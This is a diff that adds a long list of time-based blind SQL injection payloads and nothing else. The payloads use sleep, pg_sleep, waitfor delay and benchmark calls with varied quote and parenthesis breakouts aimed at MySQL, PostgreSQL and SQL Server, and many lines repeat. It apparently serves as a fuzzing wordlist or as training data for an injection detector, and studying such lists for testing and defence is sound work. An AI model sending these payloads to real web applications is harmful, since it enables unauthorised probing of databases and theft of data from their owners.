@@ -1,0 +1,500 @@
+1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --
+1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg
+1"  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  "zxks"  =  "zxks
+1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl
+1" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and "kojr"  =  "kojr
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd
+1%"   )    )    rlike sleep  (  5  )   and    (    (   "%"  =  "
+1" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   "chvi" like "chvi
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '
+1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1"  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    as xbii where 2262  =  2262 or sleep  (  5  )  --
+1%"   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "lsis" like "lsis
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "lsis" like "lsis
+1" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+ select sleep  (  5  )   and    (    (   "rthl" like "rthl
+1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --
+1%"   )    )    or sleep  (  5  )   and    (    (   "%"  =  "
+1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--
+ select sleep  (  5  )   and    (    (     (  "uvzc" like "uvzc
+1%" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1%"   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1"   )    )     )   rlike sleep  (  5  )   and    (    (     (  "eefg"  =  "eefg
+select sleep  (  5  )   and    (    (     (  "wucy" like "wucy
+1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #
+1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf
+1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1"   )    )    as uqkn where 4642  =  4642 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik
+1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   
+1" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg
+1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #
+1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  '
+1" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1"   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #
+1%"   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   "%"  =  "
+1%'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +'
+1  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1"  )   rlike sleep  (  5  )   and   (  "efoq" like "efoq
+1%"   )    )     )   rlike sleep  (  5  )   and    (    (     (  "%"  =  "
+1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'
+1"   )    )    or sleep  (  5  )   and    (    (   "mcyv"  =  "mcyv
+1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin
+1" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select pg_sleep  (  5  )   and    (    (     (  '%'  =  '
+1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'vrim'  =  'vrim
+1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '
+1"   )    )     )   or sleep  (  5  )   and    (    (     (  "hdis" like "hdis
+1%' or elt  (  6272  =  6272,sleep  (  5   )    )    and '%'  =  '
+1 where 7196  =  7196 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1%"  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq
+waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  '
+1"   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select sleep  (  5  )   and    (    (   'srfc' like 'srfc
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pgth'  =  'pgth
+1'   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  '
+1   )    )    as pynj where 7683  =  7683 waitfor delay '0:0:5'--
+1 where 1842  =  1842 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  '%'  =  '
+1"  )   as ghpx where 2873  =  2873 waitfor delay '0:0:5'--
+select sleep  (  5  )   and    (    (     (  "lczw"  =  "lczw
+1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik
+1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #
+1" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl
+1%' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and '%'  =  '
+1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  '
+1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+waitfor delay '0:0:5' and    (    (     (  "lpeo"  =  "lpeo
+1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   # awpq
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs
+1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"   )    )     )   rlike sleep  (  5  )   and    (    (     (  "eefg"  =  "eefg
+select pg_sleep  (  5  )   and    (    (     (  "nvuv" like "nvuv
+1   )    )    as msug where 3503  =  3503 and sleep  (  5  )  #
+1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #
+1%"  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+1" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1"   )    )    as ydkd where 2455  =  2455 and sleep  (  5  )  --
+1" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   
+1" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and "ojpe" like "ojpe
+1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1%"   )    )    or sleep  (  5  )   and    (    (   "%"  =  "
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy
+ select sleep  (  5  )   and    (    (     (  "uvzc" like "uvzc
+1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl
+1"  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1"  )   and sleep  (  5  )   and   (  "fsuf" like "fsuf
+1' where 5702  =  5702 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg
+1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt
+1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --
+1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+select pg_sleep  (  5  )   and    (    (     (  'xobx'  =  'xobx
+1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "baia"  =  "baia
+1"   )    )    or sleep  (  5  )   and    (    (   "mcyv"  =  "mcyv
+1" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioar
+1%" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq
+1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"   )    )    or sleep  (  5  )   and    (    (   "%"  =  "
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '
+1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'tufg'  =  'tufg
+1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  "%"  =  "
+1"  )   rlike sleep  (  5  )   and   (  "efoq" like "efoq
+1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq
+1" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1 where 7158  =  7158 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '
+1  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481
+1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  "btht"  =  "btht
+1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1" where 7279  =  7279 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||'
+1%"   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +'
+1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+select sleep  (  5  )   and    (    (   'keoy'  =  'keoy
+1"   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   "chvi" like "chvi
+1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd
+1"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   
+1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--
+1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1"  )   where 2922  =  2922 or elt  (  6272  =  6272,sleep  (  5   )    )   --
+1"   )    )     )   or sleep  (  5  )   and    (    (     (  "hdis" like "hdis
+1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq
+1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp
+1%"   )    )    or sleep  (  5  )   and    (    (   "%"  =  "
+1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --
+1'   )    )    rlike sleep  (  5  )   and    (    (   'qitl' like 'qitl
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags
+1%" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and "%"  =  "
+waitfor delay '0:0:5' and    (    (     (  "lpeo"  =  "lpeo
+1  )   as cwsi where 7360  =  7360 or sleep  (  5  )  #
+1" where 4688  =  4688 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1"   )    )     )   or sleep  (  5  )   and    (    (     (  "eran"  =  "eran
+1" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and "kojr"  =  "kojr
+ (  select * from   (  select  (  sleep  (  5   )    )     )  acdk  )  #
+1"  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs
+1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1"  )   and sleep  (  5  )   and   (  "fsuf" like "fsuf
+1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) 
+select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg
+1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '
+1" where 5328  =  5328 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  "poik"  =  "poik
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1' where 7725  =  7725 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) 
+1%"   )    )     )   rlike sleep  (  5  )   and    (    (     (  "%"  =  "
+1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt
+1 where 5466  =  5466 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "lsis" like "lsis
+1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv
+1"  )   as mszg where 6184  =  6184 rlike sleep  (  5  )  --
+1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   
+waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta
+1" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #
+select sleep  (  5  )   and    (    (     (  "lczw"  =  "lczw
+1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin
+1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru
+1"   )    )     )   rlike sleep  (  5  )   and    (    (     (  "eefg"  =  "eefg
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866
+1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd
+select sleep  (  5  )   and    (    (     (  'thqr' like 'thqr
+1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--
+1"  )   or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   
+1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   "%"  =  "
+1"   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+ select sleep  (  5  )   and    (    (     (  "uvzc" like "uvzc
+1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu
+1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --
+1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '
+1"   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +'
+1'  )   where 4364  =  4364 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru
+1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt
+1%'   )    )    or sleep  (  5  )   and    (    (   '%'  =  '
+select sleep  (  5  )   and    (    (     (  'rzjf'  =  'rzjf
+1" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and "ojpe" like "ojpe
+1" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  
+1%"  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  
+1%'   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   '%'  =  '
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'urxs'  =  'urxs
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd
+1" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1   )    )    as beld where 1679  =  1679 or sleep  (  5  )  #
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  '
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%"   )    )    rlike sleep  (  5  )   and    (    (   "%"  =  "
+1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874
+1%"   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1"  )   as amak where 7938  =  7938 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv
+1"   )    )    as nsbu where 6569  =  6569 or sleep  (  5  )  #
+1%"   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874
+1"   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1"   )    )    or sleep  (  5  )   and    (    (   "mcyv"  =  "mcyv
+1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs
+1'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  "ubvd"  =  "ubvd
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt
+select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb
+1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin
+1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt
+1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags
+1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg
+select sleep  (  5  )   and    (    (   'wyvx'  =  'wyvx
+1'  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and   (  'seyd'  =  'seyd
+1%"   )    )     )   rlike sleep  (  5  )   and    (    (     (  "%"  =  "
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1'   )    )    as bewk where 3672  =  3672 or sleep  (  5  )  --
+1" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags
+1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq
+1%'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs
+1"  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #
+1'||  (  select 'svbf' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'
+ (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and '%'  =  '
+1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1'+  (  select 'gmpn' where 8137  =  8137 or sleep  (  5   )    )   +'
+1'  )   as jxtg where 1071  =  1071 and sleep  (  5  )  --
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   '%'  =  '
+1" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and "ojpe" like "ojpe
+1%" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and "%"  =  "
+1"   )    )    as yiaw where 2841  =  2841 or sleep  (  5  )  --
+1%'   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1"   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   "chvi" like "chvi
+1'+  (  select 'plcm' where 2141  =  2141 and elt  (  3114  =  3114,sleep  (  5   )    )   #
+1"   )    )     )   or sleep  (  5  )   and    (    (     (  "hdis" like "hdis
+1"  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --
+ select sleep  (  5  )   and    (    (     (  "zlal"  =  "zlal
+1"   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1"  )   rlike sleep  (  5  )   and   (  "efoq" like "efoq
+1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) 
+1 and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) 
+1"  )   rlike sleep  (  5  )   and   (  "efoq" like "efoq
+1   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1%' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and '%'  =  '
+1   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+ select sleep  (  5  )   and    (    (     (  "uvzc" like "uvzc
+1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'raru'  =  'raru
+1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --
+1%" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and "%"  =  "
+1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs
+1  )   where 3062  =  3062 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  "lsis" like "lsis
+1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'fegp'  =  'fegp
+1   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #
+1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf
+1 where 2239  =  2239 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --
+1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv
+1 and elt  (  1210  =  1210,sleep  (  5   )    )   -- ommf
+1  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv
+1  )   where 5234  =  5234 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #
+1"   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1" where 2309  =  2309 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1%' and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'ogpg'  =  'ogpg
+1'   )    )    as lmsl where 3753  =  3753 or elt  (  5873  =  5873,sleep  (  5   )    )   #
+1' where 5786  =  5786 and elt  (  1210  =  1210,sleep  (  5   )    )   --
+1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --
+1' where 7014  =  7014 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --
+1 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #
+1"   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1'  )   and sleep  (  5  )   and   (  'xecl' like 'xecl
+1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #
+1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) 
+1"  )   and sleep  (  5  )   and   (  "fsuf" like "fsuf
